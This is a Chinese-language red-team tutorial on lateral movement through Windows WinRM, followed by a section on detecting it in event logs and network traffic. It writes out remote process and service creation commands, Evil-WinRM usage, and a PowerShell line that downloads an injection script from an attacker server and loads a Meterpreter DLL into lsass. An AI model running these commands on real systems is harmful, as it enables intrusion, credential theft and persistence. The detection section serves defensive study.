# 内网移动

> WINRM 服务提供远程执行系统命令的特点，使得在内网环境下的横向移动变的极为方便

## 通过 WINRM 直接进行横向移动

在winrm.vbs的参数选项中有一个`invoke`参数，此操作允许使用WinRM对目标对象执行特定方法。执行命令`winrm invoke Create wmicimv2/win32_process @{CommandLine="calc.exe"}`将会在本地弹出计算器：

该命令调用Windows WMI中Win32\_process类的Create方法，生成了一个calc.exe的新进程。通过这种方式，可以使用WinRM在远程Windows服务器上起一个新进程。例如执行：

```shell
winrm invoke Create wmicimv2/win32_process @{CommandLine="calc.exe"} -r:http://10.0.83.30:5985 -u:administrator -p:123456
```

可以在远程在Windows服务器上运行一个静默执行的calc.exe新进程：

同样，也可以调用Win32\_service类的Create方法，以生成服务的形式运行特定程序。首先执行以下命令创建服务：

```shell
winrm invoke Create wmicimv2/Win32_Service @{Name="test";DisplayName="test";PathName="cmd.exe /k c:\windows\system32\calc.exe"} -r:http://10.0.83.30:5985 u:administrator -p:123456
```

接着执行下面的命令运行服务：

```shell
winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://10.0.83.30:5985 u:administrator -p:123456
```

使用上述方法即可控制远程主机下载远控后门并达到持续渗透和权限维持的目的。

## 通过 WinRM 间接进行横向移动

在第一节的配置环境基础上，下面测试使用PowerShell远程获得Windows服务器的交互式PowerShell，这首先需要确保Windows服务器正在运行WinRM服务并允许PowerShell被远程连接。可在Windows服务器的PowerShell中执行 `Enable-PSRemoting –force` 开启PowerShell的远程连接：

此时，在另一台Windows主机上使用PowerShell执行 `Enter-PSSession -ComputerName 10.0.83.30 -Credential administrator`即可连接至这台Windows服务器，在弹框中输入密码，获得这台Windows服务器的交互式PowerShell：

此过程的流程图如下:

WinRM在这里作为通道连接了两端的PowerShell。当然，在红队角度来说，工具是千变万化的。

Python与Ruby均有支持WinRM操作的库，这使得连接WinRM的方式将更加灵活，攻击活动将被控制在命令行中。例如GitHub上的开源工具[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)，使用WinRM的ruby库`winrm`及`winrm-fs`，可以通过WinRM服务快速获得一个交互式Shell，并支持PowerShell的全部命令。

接下来我们尝试通过Evil-WinRM工具连接远程Windows服务器的WinRM服务并获得交互式PowerShell。克隆项目后执行命令`ruby evil-wnrm.rb -i 10.0.83.30 -u administrator -p 123456`即可连接至运行WinRM服务的Windows服务器:

另外，Evil-WinRM提供了一个menu命令，可通过加载`Invoke-Binary`和`l04d3r-LoadDll`两个自定义函数，实现无文件执行PE文件和DLL加载，但实际测试时这两个函数无法稳定使用，加载Meterpreter Payload会出现报错情况。

当然还有更优雅的方式，例如使用PowerSploit。

首先，生成一个包含Meterpreter Payload的DLL文件t0y.dll。接着通过`python -m SimpleHTTPServer 8000`开启临时HTTP服务，将[@clymb3r](https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1)修改后的反射DLL文件注入脚本Invoke-ReflectivePEInjection.ps1与t0y.dll一同放置在目录下，以便使远程服务器获取。使MSF监听本地端口以得到Meterpreter会话：

在Evil-WinRM的交互式Shell中直接执行：

```shell
IEX (New-Object Net.WebClient).DownloadString('http://10.0.84.102:8000/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://10.0.84.102:8000/t0y.dll -procname lsass
```

此时将下载Invoke-ReflectivePEInjection.ps1执行，并将t0y.dll注入到lsass进程中：

至此，DLL文件被注入进目标Windows服务器的内存并获得Meterpreter Shell。当然，也可以直接使用PowerSploit完成对网络的进一步探测。例如使用Recon模块对内网主机端口扫描：

或者尝试获取域控制器的密码等等：

可见，透过WinRM服务可以使用多种渗透框架对目标网络进行渗透攻击，此时WinRM更像是一个通道或者一扇门。

## WinRM 活动的捕获&检测

以第二节的攻击活动作为基础，尝试从Windows日志以及流量层面检测使用WinRM服务进行的横向移动。

### 通过Windows日志检测WinRM活动

使用WinRM服务时，Windows会在两个位置记录相关日志，分别为`%SystemRoot%\System32\Winevt\Logs\Security.evtx`Windows安全事件日志及`%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-WinRM%4Operational.evtx`WinRM服务操作日志。

为方便测试，先分别清空本地Windows主机和远程Windows服务器的这两处日志。以PowerShell Remoting为例，从本地Windows主机登录远程Windows服务器执行一条系统命令`ipconfig`后退出，随后查看此过程产生的日志。

在安全事件日志中产生了三次事件ID为4648的Windows登录事件，被登录主机为WIN-IMRNLMU4L5U，并且指向PowerShell进程：

`4648`事件是Windows用于记录显式凭据登录的事件，并且无论登录是否成功都会记录。由于PowerShell Remoting会使用显式的弹框提示用户输入登录远程主机的账户密码，因此产生此日志。

WinRM服务操作日志中记录了与WinRM服务所有相关的操作，并且从时间线上依次有WSMan初始化、WSMan API调用（初始化建立连接）、用户身份验证请求及响应、WSMan API调用（具体操作）请求及响应。从日志的详情中能看到每一次操作的具体情况，例如客户端发送命令给远程主机：

在远程Windows服务器上，再来看这两个日志。

与发起登录的Windows主机不同，这里安全事件日志上分别生成了事件ID为`4776`、`4672`、`4624`、`4634`的四种日志，分别对应凭据验证、特殊登录、登录及注销四个事件，并且也都产生了三次。

`4776`事件记录远程主机发送验证包进行NTLM验证的过程，发送的验证包为为`MICROSOFT_AUTHENTICATION_PACKAGE_V1_0`。`4672`事件记录Windows赋予登录账户特殊权限的过程，在使用PowerShell Remoting登录的过程中，Windows服务器赋予登录账户特殊权限，并形成与管理员账户的某些等效特权（但并不完全等同于管理员账户）：

`4624`事件是账号成功登录的标志，`4643`事件则是账户退出登录的标志。

综合这四个事件的日志可以判断，一台Windows主机使用NTLM认证的方式成功登录了当前Windows服务器，并拥有一定的管理员特权。

转向WinRM服务操作日志，这里只记录了四个事件，只能看到WSMan API被调用并给出响应，不够详细：

从两台主机的日志可以看出，WinRM服务连接的请求发起方记录明显要比被连接方更详细，远程Windows服务器作为被攻击主机，在日志上只能记录Windows远程登录的详细情况，而无法记录WinRM操作较详细的过程，这对横向移动的检测明显不利。

借助WinRM服务进行的内网横移活动，日志层面监控需要借助新的工具来实现记录，例如[Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)。从日本Cert/CC的[研究](https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WinRM.htm)可以看到，Sysmon能较完整的记录WinRM服务的操作日志。

### 通过网络流量检测WinRM活动

我们通过winrm的`invoke`参数在远程Windows服务器上生成一个运行计算器程序的进程，并在此Windows服务器上捕获过程中产生的网络流量。

从图中可以看到，客户端PC使用NTLM认证登录Windows服务器，并随后向其发送了经过加密的WS-Management协议消息。由于会话进行了加密，因此无法从流量内容中解密出具体的操作请求与响应内容：

```shell
POST /wsman HTTP/1.1
Authorization: Negotiate TlRMTVNTUAADAAAAGAAYAK4AAAAIAQgBxgAAAB4AHgBYAAAAGgAaAHYAAAAeAB4AkAAAABAAEADOAQAANYKI4gYAchcAAAAPQA/P/h+iVrUOR96DLmXOKlcASQBOAC0ATwBNAFoASwBLAE8ANQBTADIAVwBIAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAVwBJAE4ALQBPAE0AWgBLAEsATwA1AFMAMgBXAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9MKfRjLb04PzgEvw8c8H3AEBAAAAAAAAONk/OuNt1QFYO76+xRQ5LQAAAAACAB4AVwBJAE4ALQBJAE0AUgBOAEwATQBVADQATAA1ADEAAQAeAFcASQBOAC0ASQBNAFIATgBMAE0AVQA0AEwANQAxAAQAHgBXAEkATgAtAEkATQBSAE4ATABNAFUANABMADUAMQADAB4AVwBJAE4ALQBJAE0AUgBOAEwATQBVADQATAA1ADEABwAIADjZPzrjbdUBBgAEAAIAAAAIADAAMAAAAAAAAAAAAAAAADAAAIc2vSJKkSPg+7uRSE04RPyCY4BjWZ4SV7AX5qGi9IZSAAAAAAAAAAAAAAAAFQ/q0cp5XKIemClSmHpBig==
Content-Type: multipart/encrypted;protocol="application/HTTP-SPNEGO-session-encrypted";boundary="Encrypted Boundary"
User-Agent: Microsoft WinRM Client
Host: 10.0.83.30:5985
Content-Length: 2586
Connection: Keep-Alive

--Encrypted Boundary
Content-Type: application/HTTP-SPNEGO-session-encrypted
OriginalContent: type=application/soap+xml;charset=UTF-16;Length=2330
--Encrypted Boundary
Content-Type: application/octet-stream
.............Q3R....3H......?.xL}..8.I
............................(此处省略)
[...3...a...|^.sDox'."...Bww.--Encrypted Boundary--
```

```shell
HTTP/1.1 200
Content-Type: multipart/encrypted;protocol="application/HTTP-SPNEGO-session-encrypted";boundary="Encrypted Boundary"
Server: Microsoft-HTTPAPI/2.0
Date: Wed, 18 Sep 2019 05:37:57 GMT
Content-Length: 2202

--Encrypted Boundary
Content-Type: application/HTTP-SPNEGO-session-encrypted
OriginalContent: type=application/soap+xml;charset=UTF-16;Length=1946
--Encrypted Boundary
Content-Type: application/octet-stream
.........t3.d.O...../....-....N7C..B....2.....r.
.............................(此处省略)
...DP.....@...A..e...Z....6.7...M.l|.PU...vA.J...7.T...--Encrypted Boundary--
```

经过测试，使用PowerShell Remoting、Evil-WinRM工具产生的WinRM连接流量均与之类似。可见在WinRM服务未开启监听HTTPS端口的情况下，Windows依然会加密WinRM会话以保证通信数据的完整性。不过，仍然可以通过HTTP请求与响应中的明文部分捕获WinRM认证及操作的行为，例如`Microsoft WinRM Client`、`Encrypted Boundary`、`HTTP-SPNEGO-session-encrypted`等关键字，并以此进行关联产生侦测到WinRM服务成功调用的预警。

## 参考文章

* [内网横移之 WINRM](https://0x0c.cc/2019/09/25/%E5%86%85%E7%BD%91%E6%A8%AA%E7%A7%BB%E4%B9%8BWinRM/#%E5%86%85%E7%BD%91%E6%A8%AA%E7%A7%BB%E4%B8%AD%E7%9A%84WinRM)
